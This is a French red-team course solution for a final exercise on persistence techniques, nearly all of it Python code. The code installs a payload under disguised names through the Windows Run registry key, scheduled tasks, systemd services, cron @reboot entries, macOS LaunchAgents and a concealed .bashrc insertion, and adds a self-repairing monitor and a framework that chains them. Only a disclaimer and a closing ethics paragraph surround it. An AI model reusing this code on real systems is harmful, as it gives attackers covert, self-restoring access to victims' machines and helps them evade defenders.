SOLUTION EXERCICE 25: TECHNIQUES DE PERSISTENCE
===============================================

*** DERNIER EXERCICE - SOLUTION FINALE ***

AVERTISSEMENT: Cette solution conclut la formation red teaming.
Usage strictement professionnel et éthique. Responsabilité totale de l'utilisateur.

================================
IMPLÉMENTATIONS COMPLÈTES
================================

1. WINDOWS REGISTRY PERSISTENCE
================================

```python
import winreg

class WindowsRegistryPersistence:
    @staticmethod
    def install_hkcu_persistence(payload_path, key_name):
        try:
            # Copier payload vers emplacement discret
            appdata = os.getenv('APPDATA')
            target_dir = os.path.join(appdata, 'Microsoft', 'SystemUpdate')
            os.makedirs(target_dir, exist_ok=True)

            target_path = os.path.join(target_dir, 'updater.exe')
            shutil.copy2(payload_path, target_path)

            # Ajouter clé Registry
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )

            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, target_path)
            winreg.CloseKey(key)

            print(f"[+] Registry persistence installée: {key_name}")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

    @staticmethod
    def remove_persistence(key_name):
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )

            winreg.DeleteValue(key, key_name)
            winreg.CloseKey(key)

            print(f"[+] Persistence supprimée: {key_name}")
            return True

        except FileNotFoundError:
            print("[!] Clé non trouvée")
            return False
        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
2. SCHEDULED TASKS (WINDOWS)
=============================

```python
class WindowsScheduledTask:
    @staticmethod
    def create_task_logon(payload_path, task_name):
        try:
            # Commande schtasks
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', payload_path,
                '/sc', 'onlogon',
                '/f'  # Force overwrite
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"[+] Scheduled task créée: {task_name}")
                return True
            else:
                print(f"[!] Erreur: {result.stderr}")
                return False

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

    @staticmethod
    def create_task_periodic(payload_path, task_name, interval_minutes):
        try:
            cmd = [
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', payload_path,
                '/sc', 'minute',
                '/mo', str(interval_minutes),
                '/f'
            ]

            result = subprocess.run(cmd, capture_output=True, text=True)

            if result.returncode == 0:
                print(f"[+] Scheduled task périodique: {task_name} ({interval_minutes}min)")
                return True
            else:
                print(f"[!] Erreur: {result.stderr}")
                return False

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
3. SYSTEMD SERVICE (LINUX)
===========================

```python
class SystemdService:
    @staticmethod
    def create_service(payload_path, service_name, user_service=False):
        try:
            # Définir emplacement selon type
            if user_service:
                service_dir = Path.home() / '.config' / 'systemd' / 'user'
                service_dir.mkdir(parents=True, exist_ok=True)
            else:
                service_dir = Path('/etc/systemd/system')

            service_file = service_dir / f'{service_name}.service'

            # Contenu du service
            service_content = f"""[Unit]
```
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart={payload_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

```python
            # Écrire fichier
            with open(service_file, 'w') as f:
                f.write(service_content)

            # Recharger systemd
            subprocess.run(['systemctl', 'daemon-reload'], check=True)

            # Enable service
            enable_cmd = ['systemctl', 'enable', service_name]
            if user_service:
                enable_cmd.insert(1, '--user')

            subprocess.run(enable_cmd, check=True)

            print(f"[+] Service systemd créé et activé: {service_name}")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

    @staticmethod
    def remove_service(service_name, user_service=False):
        try:
            # Stop
            stop_cmd = ['systemctl', 'stop', service_name]
            if user_service:
                stop_cmd.insert(1, '--user')
            subprocess.run(stop_cmd)

            # Disable
            disable_cmd = ['systemctl', 'disable', service_name]
            if user_service:
                disable_cmd.insert(1, '--user')
            subprocess.run(disable_cmd)

            # Supprimer fichier
            if user_service:
                service_file = Path.home() / '.config' / 'systemd' / 'user' / f'{service_name}.service'
            else:
                service_file = Path(f'/etc/systemd/system/{service_name}.service')

            if service_file.exists():
                service_file.unlink()

            subprocess.run(['systemctl', 'daemon-reload'])

            print(f"[+] Service supprimé: {service_name}")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
4. CRON JOBS
============

```python
class CronPersistence:
    @staticmethod
    def install_reboot_cron(payload_path, user_cron=True):
        try:
            if user_cron:
                # Lire crontab actuel
                try:
                    result = subprocess.run(
                        ['crontab', '-l'],
                        capture_output=True,
                        text=True,
                        check=True
                    )
                    current_cron = result.stdout
                except subprocess.CalledProcessError:
                    current_cron = ""

                # Ajouter ligne @reboot
                new_line = f"@reboot {payload_path} &\n"

                if new_line.strip() not in current_cron:
                    new_cron = current_cron + new_line

                    # Installer nouveau crontab
                    process = subprocess.Popen(
                        ['crontab', '-'],
                        stdin=subprocess.PIPE,
                        text=True
                    )
                    process.communicate(new_cron)

                    print(f"[+] Cron job @reboot installé")
                    return True
            else:
                # System cron
                with open('/etc/crontab', 'a') as f:
                    f.write(f"@reboot root {payload_path} &\n")

                print("[+] System cron job installé")
                return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

    @staticmethod
    def remove_cron(payload_path):
        try:
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            current_cron = result.stdout

            # Filtrer lignes contenant payload
            lines = [l for l in current_cron.splitlines() if payload_path not in l]
            new_cron = '\n'.join(lines) + '\n'

            # Réinstaller
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(new_cron)

            print("[+] Cron jobs nettoyés")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
5. LAUNCH AGENTS (MACOS)
=========================

```python
class LaunchAgentPersistence:
    @staticmethod
    def create_launch_agent(payload_path, label):
        try:
            launch_agents_dir = Path.home() / 'Library' / 'LaunchAgents'
            launch_agents_dir.mkdir(parents=True, exist_ok=True)

            plist_file = launch_agents_dir / f'{label}.plist'

            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
```
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
```python
    <string>{label}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
```
</dict>
</plist>"""

```python
            with open(plist_file, 'w') as f:
                f.write(plist_content)

            # Load avec launchctl
            subprocess.run(['launchctl', 'load', str(plist_file)], check=True)

            print(f"[+] Launch Agent créé: {label}")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
6. SHELL INIT MODIFICATION
===========================

```python
class ShellInitPersistence:
    @staticmethod
    def modify_shell_init(command, shell_file='.bashrc'):
        try:
            shell_path = Path.home() / shell_file
            backup_path = Path.home() / f'{shell_file}.backup'

            # Backup
            if shell_path.exists():
                shutil.copy2(shell_path, backup_path)

            # Lire contenu
            if shell_path.exists():
                with open(shell_path, 'r') as f:
                    content = f.read()
            else:
                content = ""

            lines = content.splitlines()

            # Insérer au milieu (discret)
            middle = len(lines) // 2
            lines.insert(middle, f"\n# System path update\n{command}\n")

            # Écrire
            with open(shell_path, 'w') as f:
                f.write('\n'.join(lines))

            print(f"[+] Shell init modifié: {shell_file}")
            return True

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

    @staticmethod
    def restore_shell_init(shell_file='.bashrc'):
        try:
            shell_path = Path.home() / shell_file
            backup_path = Path.home() / f'{shell_file}.backup'

            if backup_path.exists():
                shutil.copy2(backup_path, shell_path)
                backup_path.unlink()
                print(f"[+] Shell init restauré: {shell_file}")
                return True
            else:
                print("[!] Backup non trouvé")
                return False

        except Exception as e:
            print(f"[!] Erreur: {e}")
            return False

```
7. MONITORING ET AUTO-RÉPARATION
=================================

```python
import threading

class PersistenceMonitor:
    def check_mechanism(self, mechanism):
        mech_type = mechanism['type']

        if mech_type == 'systemd':
            result = subprocess.run(
                ['systemctl', 'is-enabled', mechanism['name']],
                capture_output=True
            )
            return result.returncode == 0

        elif mech_type == 'cron':
            result = subprocess.run(
                ['crontab', '-l'],
                capture_output=True,
                text=True
            )
            return mechanism['payload'] in result.stdout

        # Autres types...
        return False

    def repair_mechanism(self, mechanism):
        print(f"[!] Réparation de {mechanism['name']}")

        mech_type = mechanism['type']

        if mech_type == 'systemd':
            SystemdService.create_service(
                mechanism['payload'],
                mechanism['name']
            )

        elif mech_type == 'cron':
            CronPersistence.install_reboot_cron(mechanism['payload'])

        # Autres types...

    def monitor_loop(self, interval=300, max_repairs=3):
        print(f"[*] Démarrage monitoring (intervalle: {interval}s)")

        while True:
            for mechanism in self.mechanisms:
                if not self.check_mechanism(mechanism):
                    repairs = self.repair_count.get(mechanism['name'], 0)

                    if repairs < max_repairs:
                        self.repair_mechanism(mechanism)
                        self.repair_count[mechanism['name']] = repairs + 1
                    else:
                        print(f"[!] Max repairs atteint pour {mechanism['name']}")

            time.sleep(interval)

```
8. FRAMEWORK COMPLET
====================

```python
class PersistenceFramework:
    def install_full_persistence(self, payload_path, config=None):
        os_type = platform.system()
        report = {
            'os': os_type,
            'payload': payload_path,
            'mechanisms': [],
            'timestamp': datetime.now().isoformat()
        }

        mechanisms_to_install = self.PROFILES[self.profile]['mechanisms']

        for mechanism_type in mechanisms_to_install:
            try:
                if os_type == 'Linux':
                    if mechanism_type == 'systemd':
                        success = SystemdService.create_service(
                            payload_path,
                            'system-monitor'
                        )
                        if success:
                            report['mechanisms'].append({
                                'type': 'systemd',
                                'name': 'system-monitor',
                                'status': 'installed'
                            })

                    elif mechanism_type == 'cron':
                        success = CronPersistence.install_reboot_cron(payload_path)
                        if success:
                            report['mechanisms'].append({
                                'type': 'cron',
                                'status': 'installed'
                            })

                elif os_type == 'Darwin':
                    if mechanism_type == 'launchagent':
                        success = LaunchAgentPersistence.create_launch_agent(
                            payload_path,
                            'com.system.agent'
                        )
                        if success:
                            report['mechanisms'].append({
                                'type': 'launchagent',
                                'label': 'com.system.agent',
                                'status': 'installed'
                            })

                elif os_type == 'Windows':
                    if mechanism_type == 'registry':
                        success = WindowsRegistryPersistence.install_hkcu_persistence(
                            payload_path,
                            'SystemUpdate'
                        )
                        if success:
                            report['mechanisms'].append({
                                'type': 'registry',
                                'key': 'SystemUpdate',
                                'status': 'installed'
                            })

            except Exception as e:
                print(f"[!] Erreur {mechanism_type}: {e}")

        # Démarrer monitoring si activé
        if self.PROFILES[self.profile]['monitoring']:
            monitor = PersistenceMonitor(report['mechanisms'])
            monitor_thread = threading.Thread(
                target=monitor.monitor_loop,
                args=(300, 3),
                daemon=True
            )
            monitor_thread.start()
            print("[*] Monitoring démarré en arrière-plan")

        return report

    def cleanup_all(self):
        print("[*] Suppression de toute la persistence...")

        os_type = platform.system()

        if os_type == 'Linux':
            SystemdService.remove_service('system-monitor')
            CronPersistence.remove_cron('/usr/local/bin/malware')
            ShellInitPersistence.restore_shell_init('.bashrc')

        elif os_type == 'Darwin':
            LaunchAgentPersistence.remove_launch_agent('com.system.agent')
            CronPersistence.remove_cron('/usr/local/bin/malware')

        elif os_type == 'Windows':
            WindowsRegistryPersistence.remove_persistence('SystemUpdate')
            WindowsScheduledTask.remove_task('SystemMaintenance')

        print("[+] Nettoyage complet terminé")
        return True

```
================================
UTILISATION COMPLÈTE
================================

# Installation profil resilient
framework = PersistenceFramework(profile='resilient')
report = framework.install_full_persistence('/path/to/payload')

```python
print(json.dumps(report, indent=2))

```
# Monitoring automatique se lance
# Attendre, tester...

# Cleanup complet
framework.cleanup_all()

================================
CONCLUSION FINALE
================================

*** FORMATION TERMINÉE - 25 EXERCICES COMPLÉTÉS ***

Vous avez maintenant une compréhension complète de:
1. Reconnaissance et énumération (Ex 1-5)
2. Exploitation Web et réseau (Ex 6-15)
3. Post-exploitation (Ex 16-21)
4. Red teaming avancé (Ex 22-25)

RESPONSABILITÉ FINALE:

Ces connaissances vous donnent un pouvoir immense.
Utilisez-les UNIQUEMENT pour:
- Protéger et sécuriser
- Tests autorisés
- Formation éthique
- Amélioration de la sécurité

JAMAIS pour:
- Attaques non autorisées
- Compromission malveillante
- Maintien d'accès illégitime

Votre carrière et réputation dépendent de vos choix éthiques.

Félicitations pour avoir complété cette formation intensive!
Devenez un professionnel de la sécurité respecté et éthique.

Bonne continuation!
